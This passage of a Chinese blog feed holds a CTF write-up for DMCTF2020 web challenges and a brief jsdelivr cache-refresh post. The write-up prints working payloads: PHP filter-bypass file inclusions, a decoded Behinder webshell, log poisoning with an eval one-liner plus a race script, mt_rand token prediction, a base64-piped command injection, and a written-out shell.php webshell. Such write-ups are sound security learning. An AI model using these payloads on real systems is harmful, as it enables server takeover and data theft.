class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">JAVASCRIPT</span><br><span class="line">class PlayerData</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; track player data between levels (when player is destroyed)</span><br><span class="line">    constructor()</span><br><span class="line">    &#123;</span><br><span class="line">        this.health &#x3D; 3;</span><br><span class="line">        this.healthMax &#x3D; 3;</span><br><span class="line">        this.boomerangs &#x3D; 1;</span><br><span class="line">        this.bigBoomerangs &#x3D; 0;</span><br><span class="line">        this.coins &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 人物属性值中的<code>health</code>、<code>healthMax</code>、<code>bigBoomerangs</code>数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。</p><p> 击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129204724.jpg" alt="img"></p><h2 id="bingxie"><a href="#bingxie" class="headerlink" title="bingxie"></a>bingxie</h2><p> 首先根据提示：<strong>你需要一些特殊软件</strong>，再看题目联想到<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases">Behinder</a>，首先下载工具。</p><p>分析题目：</p><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function filter($file) &#x2F;&#x2F;hint in bingxie.php</span><br><span class="line">&#123;</span><br><span class="line">    $file &#x3D; strtolower($file);</span><br><span class="line">    $file &#x3D; str_replace(&#39;php&#39;, &quot;&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&#39;data&#39;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&#39;http&#39;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&#39;file&#39;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&#39;input&#39;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&#39;filter&#39;, &quot;&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&#39;log&#39;,&quot;???&quot;,$file);</span><br><span class="line">    return $file;</span><br><span class="line">&#125;</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">$md5 &#x3D;substr(md5($_GET[&#39;md5&#39;]),0,6);</span><br><span class="line"></span><br><span class="line">$file &#x3D; filter($file);</span><br><span class="line">if ($md5&#x3D;&#x3D;&#39;e95100&#39;)</span><br><span class="line">&#123;</span><br><span class="line">  include $file;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p> 代码16、17行使用GET方法获得<code>file</code>和<code>md5</code>参数，<code>file</code>经过filter函数过滤一些PHP协议，<code>md5</code>参数进行md5加密并截取前6位，判断是否为<code>e95100</code>，如果判定成功include包含<code>file</code>变量指定的文件。</p><p> 首先计算什么数进行md5加密后前六位是<code>e95100</code>。参考了<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/21636042/getting-md5-with-certain-character-pattern">Getting MD5 with certain character pattern</a>中的回答，使用脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PYTHON</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;e95100&#39;</span><br><span class="line">candidate &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    plaintext &#x3D; str(candidate)</span><br><span class="line">    hash &#x3D; hashlib.md5(plaintext.encode(&#39;ascii&#39;)).hexdigest()</span><br><span class="line">    if hash[:6] &#x3D;&#x3D; target:</span><br><span class="line">        print(&#39;plaintext:&quot;&#39; + plaintext + &#39;&quot;, md5:&#39; + hash)</span><br><span class="line">        break</span><br><span class="line">    candidate &#x3D; candidate + 1</span><br></pre></td></tr></table></figure><p> 运行之后很快得出md5加密后前六位是<code>e95100</code>的数字是<code>6666</code>。</p><p> 再根据提示<code>hint in bingxie.php</code>，直接访问<code>/bingxie.php</code>只得到一句输出：**no ,you are not a real hacker !!!**说的确实没错，想到使用php协议读取文件内容，因为<code>str_replace</code>函数只进行一次替换，所以在合适的位置进行双写即可绕过。构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">http:&#x2F;&#x2F;网址?md5&#x3D;6666&amp;file&#x3D;pphphp:&#x2F;&#x2F;fifilterlter&#x2F;convert.base64-encode&#x2F;resource&#x3D;bingxie.pphphp</span><br></pre></td></tr></table></figure><p> 得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的<a target="_blank" rel="noopener" href="https://github.com/gchq/CyberChef">github项目地址</a>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQovL+WmguaenOaOpeaUtuWIsHBhc3Plj4LmlbDvvIzliJnkvJrnlJ&#x2F;miJAxNuS9jeeahOmaj+acuuenmOmSpe+8jOWtmOWCqOWIsHNlc3Npb27kuK0NCiRhID0gJF9HRVRbJ2EnXTsNCiRiID0gJF9HRVRbJ2InXTsNCmlmKCRhIT0kYiYmbWQ1KCRhKT09bWQ1KCRiKSkNCnsNCiAgICBlY2hvICJ5b3UgYXJlIHJpZ2h0IjsNCn0NCmVsc2V7DQogICAgZGllKCJubyAseW91IGFyZSBub3QgYSByZWFsIGhhY2tlciAhISEiKTsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZWNyZXQnXSkpDQp7DQogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7DQogICAgJF9TRVNTSU9OWydrJ109JGtleTsNCiAgICBwcmludCAka2V5Ow0KfQ0KDQplbHNlDQp7DQogICAgJGtleT0kX1NFU1NJT05bJ2snXTsNCg0KICAgICRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KDQogICAgaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICB7DQogICAgICAgICR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCiAgICAgICAgJHBvc3Q9JHQoJHBvc3QuIiIpOw0KICAgICAgICANCiAgICAgICAgZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgICAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlDQogICAgew0KICAgICAgICAkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCiAgICB9DQoNCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCiAgICBjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319DQoNCiAgICBAbmV3IEMoJHBhcmFtcyk7DQp9DQo&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p> 解码后得到一个php文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">&#x2F;&#x2F;如果接收到pass参数，则会生成16位的随机秘钥，存储到session中</span><br><span class="line">$a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line">if($a!&#x3D;$b&amp;&amp;md5($a)&#x3D;&#x3D;md5($b))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;you are right&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&quot;no ,you are not a real hacker !!!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;secret&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $key&#x3D;substr(md5(uniqid(rand())),16);</span><br><span class="line">    $_SESSION[&#39;k&#39;]&#x3D;$key;</span><br><span class="line">    print $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $key&#x3D;$_SESSION[&#39;k&#39;];</span><br><span class="line"></span><br><span class="line">    $post&#x3D;file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line"></span><br><span class="line">    if(!extension_loaded(&#39;openssl&#39;))</span><br><span class="line">    &#123;</span><br><span class="line">        $t&#x3D;&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">        $post&#x3D;$t($post.&quot;&quot;);</span><br><span class="line">        </span><br><span class="line">        for($i&#x3D;0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">                 $post[$i] &#x3D; $post[$i]^$key[$i+1&amp;15];</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $post&#x3D;openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $arr&#x3D;explode(&#39;|&#39;,$post);</span><br><span class="line">    $func&#x3D;$arr[0];</span><br><span class="line">    $params&#x3D;$arr[1];</span><br><span class="line">    class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line"></span><br><span class="line">    @new C($params);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p> 后半部分根据Behinder的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2774">官方文档</a>和博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/109417674">渗透测试-流量加密之冰蝎&amp;蚁剑</a>的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行<code>$_GET[&#39;secret&#39;]</code>中的<code>secret</code>。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题<strong>weak_type</strong>中提到的不同字符串加密后md5相同绕过。最后payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">http:&#x2F;&#x2F;网址&#x2F;bingxie.php?a&#x3D;QNKCDZO&amp;b&#x3D;240610708</span><br></pre></td></tr></table></figure><p>使用Behinder连接。可以在根目录下找到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129210207.png" alt="img"></p><h2 id="filerce"><a href="#filerce" class="headerlink" title="filerce"></a>filerce</h2><p> 先看提示：<strong>看看log里面存的什么（利用伪协议包含）</strong>，以下是访问后页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$sandbox &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;sandbox&#x2F;&#39;.md5(&quot;DMCTF&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">mkdir($sandbox,0777,true);</span><br><span class="line">chdir($sandbox);</span><br><span class="line">if (isset($_GET[&#39;file&#39;])) &#123;</span><br><span class="line">    if (strpos($_GET[&quot;file&quot;], &quot;base64-decode&quot;)) &#123;</span><br><span class="line">        include $_GET[&quot;file&quot;];</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;get me a file&quot;;</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents(&quot;thx.log&quot;, base64_encode(&#39;http:&#x2F;&#x2F;&#39;.$_SERVER[&#39;HTTP_HOST&#39;].urldecode($_SERVER[&#39;REQUEST_URI&#39;])));</span><br><span class="line">echo &quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">echo &quot;You&#39;ve been recorded in $sandbox&#x2F;thx.log!!!!&quot;</span><br><span class="line">?&gt; get me a file</span><br><span class="line">You&#39;ve been recorded in &#x2F;var&#x2F;www&#x2F;html&#x2F;sandbox&#x2F;7e8c62b0ef1fa8de7542dd2272a4d021&#x2F;thx.log!!!!</span><br></pre></td></tr></table></figure><p>使用文件包含查看thx.log有什么，请求访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">http:&#x2F;&#x2F;网址?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;thx.log</span><br></pre></td></tr></table></figure><p> 输出了thx.log文件内容：<code>http://dmctf.vaala.cloud:28236/favicon.ico</code>，访问以后发现还是刚进来的页面。分析17行以下的代码，会打开thx.log文件，在里面写入的内容是<code>http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].urldecode($_SERVER[&#39;REQUEST_URI&#39;]</code>，也就是我们请求题目页面的url地址，并且多次请求以后发现log中内容成了<code>http://网址?file=php://filter/convert.base64-decode/resource=thx.log</code>。判断为竞争写入导致（因为之前做过竞争上传题目），所以在构造url中写入一句话木马：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">http:&#x2F;&#x2F;网址?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;convert.base64-decode&#x2F;resource&#x3D;thx.log</span><br></pre></td></tr></table></figure><p> 使用python脚本不断写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PYTHON</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">def CompeteUpload():  #上传页面</span><br><span class="line">    geturl&#x3D;&quot;http:&#x2F;&#x2F;dmctf.vaala.cloud:28426&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;convert.base64-decode&#x2F;resource&#x3D;thx.log&quot;     #访问上传文件</span><br><span class="line">    r1&#x3D;requests.get(url&#x3D;geturl)</span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    i&#x3D;10;</span><br><span class="line">    while (i&gt;0):</span><br><span class="line">        i-&#x3D;1;</span><br><span class="line">        CompeteUpload();</span><br></pre></td></tr></table></figure><p> 尝试访问<code>http://网址/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log</code>，会下载log文件，使用base64解码以后发现一句话木马存在，直接蚁剑连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">http:&#x2F;&#x2F;网址?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;thx.log</span><br></pre></td></tr></table></figure><p>同样在根目录下找到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129224231.png" alt="img"></p><h2 id="do-you-have-a-right-token"><a href="#do-you-have-a-right-token" class="headerlink" title="do_you_have_a_right_token"></a>do_you_have_a_right_token</h2><p> F12查看网页代码，发现注释中一大段php代码估计就是题目用到的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line">session_start();</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">if(isset($_POST[&#39;token&#39;]) &amp;&amp; isset($_SESSION[&#39;token&#39;]) &amp;&amp;!empty($_POST[&#39;token&#39;])&amp;&amp;!empty($_SESSION[&#39;token&#39;]))&#123;</span><br><span class="line">    if($_POST[&#39;token&#39;]&#x3D;&#x3D;$_SESSION[&#39;token&#39;])&#123;</span><br><span class="line">        echo &quot;PassResetSuccess! Your Flag is:&quot;.$flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;Token_error!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    mt_srand(time());</span><br><span class="line"></span><br><span class="line">    $rand&#x3D; mt_rand();</span><br><span class="line">    $_SESSION[&#39;token&#39;]&#x3D;sha1(md5($rand));</span><br><span class="line">    echo &quot;Token Generate Ok!&quot;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;token&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;&#39;;</span><br><span class="line">echo &quot;&lt;!--\r\n&quot;.file_get_contents(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p> 分析一波：判断post请求中的<code>token</code>，如果不为空则与<code>$_SESSION[&#39;token&#39;]</code>判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入<code>$_SESSION[‘token’]</code>。</p><p> 所以思路就是：<strong>我们需要知道生成的那个随机数的值</strong>，在网上搜到参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/zss192/article/details/104327432">php伪随机数</a>，可以根据种子预测随机数。题目使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">mt_srand(time());</span><br></pre></td></tr></table></figure><p> 根据第4行设置时区时间并设置随机数种子，所以在本地环境使用相同方法尝试预测随机数，但是还需考虑到本地时间和题目服务器时间不同步问题，我想到的方法是借用之前题目获得的webshell上传php文件对本地时间进行校正：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">echo time();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211010.png" alt="img"></p><p>计算时间差为69，所以修改代码跑一遍：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">&#x2F;&#x2F; echo time()-69;  这是我验证时间用的</span><br><span class="line">    mt_srand(time()-69);</span><br><span class="line">    $rand &#x3D; mt_rand();</span><br><span class="line">    echo sha1(md5($rand));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>提交本地运行后得到的密文提交上去就可以获得flag。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129211832.png" alt="img"></p><h2 id="pingpingping"><a href="#pingpingping" class="headerlink" title="pingpingping"></a>pingpingping</h2><p> 进入以后是一个类似终端的界面，随便输几个指令提示：<strong>输入help获得提示</strong>，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的<code>pingpingping</code>，可以使用通道符<code>|</code>连接执行其他命令，搜索到了疑似本题的博客<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/fd7f9fcc9333">GXYCTF–PingPingPing</a>，猜测flag很有可能还在根目录下，所以可以执行<code>cat /flag</code>输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">127.0.0.1|echo$IFS$1Y2F0IC9mbGFn|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>获得flag</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129230355.png" alt="img"></p><h2 id="p3’webshell"><a href="#p3’webshell" class="headerlink" title="p3’webshell"></a>p3’webshell</h2><p> 提示给了一个链接：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a>，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。）</p><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">&lt;?php</span><br><span class="line">$command&#x3D;$_POST[&#39;command&#39;];</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(!preg_match(&#39;&#x2F;\&#39;|&#123;|\(|\)|&#125;|\$|_|&#x3D;|1|\+|;|\.&#x2F;i&#39;, $command))&#123;</span><br><span class="line">    die(&quot;&lt;script&gt;alert(&#39;?&#39;)&lt;&#x2F;script&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">eval($command);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第4行使用正则表达式匹配<code>$command</code>字符串，但是前面有一个<code>!</code>取反，所以只要payload匹配到正则表达式即可绕过。post中请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CODE</span><br><span class="line">command&#x3D;fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&#39;);</span><br></pre></td></tr></table></figure><p>使用蚁剑连接<code>http://网址/shell.php</code>，在根目录里找到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201129225225.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DMCTF2020 </tag>
            
            <tag> Web </tag>
            
            <tag> RCE </tag>
            
            <tag> 弱类型 </tag>
            
            <tag> thinkphp漏洞 </tag>
            
            <tag> 冰蝎Behinder </tag>
            
            <tag> PHP伪协议 </tag>
            
            <tag> 伪随机数预测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsdelivr 缓存刷新</title>
      <link href="2020/jsdelivr%20%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/"/>
      <url>2020/jsdelivr%20%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。</p><h2 id="缓存刷新"><a href="#缓存刷新" class="headerlink" title="缓存刷新"></a>缓存刷新</h2><p>把原来访问的链接</p><p><code>https://cdn.jsdelivr.net/...</code></p><p>改为</p><p><code>https://purge.jsdelivr.net/...</code></p><p>访问资源就会进行刷新，然后页面会返回刷新信息：</p><p><img src="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201120222419.png"></p><p><span class='heimu'>划水</span>收工。</p>]]></content>
      
      
      <categories>
          
          <category> 捣腾博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jsdelivr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>萌娘百科黑幕实现</title>
      <link href="2020/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/"/>
      <url>2020/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/</url>
      
